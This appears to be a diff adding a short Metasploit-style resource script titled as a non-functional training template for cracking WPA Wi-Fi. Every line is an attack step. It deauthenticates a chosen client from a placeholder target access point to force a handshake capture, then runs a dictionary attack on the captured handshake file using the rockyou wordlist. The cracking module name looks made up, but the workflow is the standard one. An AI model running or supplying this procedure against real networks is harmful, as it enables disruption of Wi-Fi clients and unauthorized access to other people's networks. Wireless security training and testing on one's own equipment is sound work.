@@ -1,0 +1,14 @@
+# WPA Cracking Template
+# For Training Use – Non-functional Template
+
+use auxiliary/dos/wifi/deauth
+set INTERFACE wlan0mon
+set BSSID <TARGET_BSSID>
+set CLIENT <TARGET_CLIENT>
+set NUMBER 10
+run
+
+use auxiliary/analyze/crack_wifi
+set HANDSHAKE_FILE /tmp/handshake.cap
+set WORDLIST /usr/share/wordlists/rockyou.txt
+run
